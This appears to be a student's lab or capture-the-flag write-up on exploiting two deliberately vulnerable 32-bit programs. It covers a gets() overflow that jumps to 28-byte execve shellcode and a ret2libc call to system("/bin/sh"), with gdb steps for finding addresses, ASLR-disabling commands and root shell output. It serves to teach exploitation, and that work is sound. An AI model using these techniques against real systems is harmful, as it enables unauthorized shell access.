gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.2)

How to run: 

python3 exploit.py
(cat input_file.txt; cat) | ./Greeter
python3 exploit2.py
(cat input_file2.txt; cat) | ./Greeter_secure

Solution Thought Process for Greeter program:

Firstly, we observed that the readString function of Greeter.c uses the gets() function which is vulnerable to buffer overflow and overwriting addresses in the memory. We observed that the contents of the buf variable are copied to the Name variable which is a global variable and we were given a precompiled version of the program, so the Name address is fixed. We found a shellcode that is smaller than 48 bytes which is the space between the buf address and the return address start, and we concatinated to it the padding and then the Name address. When the program reached the return address it went to the Name address where the contents(meaning the shellcode) of the buf were copied and executed, so we got a shell.

##########################################################################################

-- Running the exploit for Greeter program:

python3 exploit.py
(cat input_file.txt; cat) | ./Greeter

Output:

root@steven-MS-7B86:/home/steven/Desktop/security/chall7/Unsolved# (cat input_file.txt; cat) | ./Greeter
What is your name?
arbitrary_text
id
uid=0(root) gid=0(root) groups=0(root)
whoami
root

##########################################################################################

-- Command for the examination of the file:

pwn checksec Greeter

Output:

Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX disabled
PIE:      No PIE (0x8048000)
RWX:      Has RWX segments

Description:

The binary is compiled for the intel 32-bit little-endian architecture.
Partial RELRO means that some parts of the relocation information are read-only after dynamic linking, but other parts, such as the Global Offset Table (GOT), remain writable. 
A stack canary is a security feature used to detect buffer overflows.
NX is disabled, meaning that the stack is marked as executable.
No PIE means that the binary is not position-independent, and its base address is fixed at 0x8048000.
The binary has segments that are both readable, writable, and executable(RWX).

##########################################################################################

-- How to find Name variable address:

gdb ./Greeter
p &Name

Output:

(gdb) p &Name
$1 = (unsigned char (*)[1024]) 0x80dacc0 <Name>

##########################################################################################

-- Finding the appropriate length for shellcode and padding:

gdb ./Greeter
disasssemble readString
c
break *0x080488f7
run
AAAA
info frame
x/20x $esp

Output:

(gdb) x/20x $esp
0xffffd460:	0x080d9000	0x080da324	0x00000354	0x41414141
0xffffd470:	0x00000000	0xffffd574	0x0805033b	0x080d9000
0xffffd480:	0x080d9000	0x080481a8	0xffffd4a8	0x00000080
0xffffd490:	0x080abf88	0x080d9000	0xffffd4a8	0x08048982
0xffffd4a0:	0xffffd4c0	0x080d9000	0x00000000	0x08048fcf

Description:

We put a breakpoint at the end of readString (leave command) to check the $eip register value which is the return address of readString (saved eip = 0x8048982) and then we checked the extended stack pointer register $esp to see where our input was written and how much space exists between the start of the buf variable and the return address, which is 48 bytes. So the length of shellcode+padding should be exactly 48 bytes. After the shellcode and the padding, we can write the address of the Name variable. Also, in the output, our input "AAAA" corresponds to 0x41414141 in hex.

##########################################################################################

-- Testing the shell code:

Installing needed packages to create i386-32-little executable instead of amd64-64-little, since our payload is for Linux Intel x86 architecture:

sudo dpkg --add-architecture i386
sudo apt-get update
sudo apt-get install libc6-dev-i386

Compile the program using "-z execstack" and "-m32" and then execute it:

gcc -m32 -z execstack -o test_shellcode test_shellcode.c
./test_shellcode

Output:

root@steven-MS-7B86:/home/steven/Desktop/security/chall7/Unsolved# ./test_shellcode
Shellcode Length: 28
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
# exit

Description:

We found and tested a 28-byte Linux Intel x86 shellcode that performs execve /bin/sh from this link: https://shell-storm.org/shellcode/files/shellcode-811.html

#########################################################################################

Bonus: Exploring the SecGreeter program:

Firstly, we disabled ASLR: 

sudo sysctl -w kernel.randomize_va_space=0

Then, we compiled the Greeter_secure.c using the following command:

gcc -ansi -fno-stack-protector -g -m32 Greeter_secure.c -o SecGreeter

#########################################################################################

Solution Thought Process for SecGreeter program:

Our thought process was about overwriting the return address of readString with the address of the system function, which is similar to execve, then use a 4-byte payload to maintain payload structure as explained in the referenced video. When system finishes, we will return into a segmentation fault, because it will return to 0x41414141 ("AAAA"). The next address on the stack has to be a string we want to execute. We provide the "/bin/sh" string as input for the system function, by providing its address. Firstly, in gdb we disassembled the readString function and put a breakpoint at the end of the function, at the leave instruction as previously, and check the $esp register to find the space between our input and the return address, which was calculated as 44 bytes, so the payload was 44 bytes in the exploit python file. Then, we found the address of the system function (0xf7df0780) by executing the following commands:

gdb SecGreeter
run
arbitrary_text
p system

Output:
$1 = {<text variable, no debug info>} 0xf7df0780 <system>

#########################################################################################

-- Running the exploit for SecGreeter program:

python3 exploit2.py
(cat input_file2.txt; cat) | ./SecGreeter

Output:

root@steven-MS-7B86:/home/steven/Desktop/security/chall7/Unsolved# (cat input_file2.txt; cat) | ./SecGreeter
What is your name?
arbitrary_text
id
uid=0(root) gid=0(root) groups=0(root)
whoami
root

#########################################################################################

We found the address of the "/bin/sh" (0xf7f3d363) by executing the following commands:

gdb SecGreeter
break readString
run
info proc map
find 0xf7daf000, +9999999, "/bin/sh" (we searched in the first start address of /usr/lib/i386-linux-gnu/libc-2.31.so that has Offset 0x0)
x/s 0xf7f3d363 (we try to verify that the address has indeed the "/bin/sh")

Output:

(gdb) find 0xf7daf000, +9999999, "/bin/sh"
0xf7f3d363
(gdb) x/s 0xf7f3d363
0xf7f3d363:	"/bin/sh" 

#########################################################################################

References:

(For Greeter program)

https://www.youtube.com/watch?v=HSlhY4Uy8SA
https://reverseengineering.stackexchange.com/questions/13928/managing-inputs-for-payload-
injection

(For SecGreeter program)

https://www.youtube.com/watch?v=m17mV24TgwY



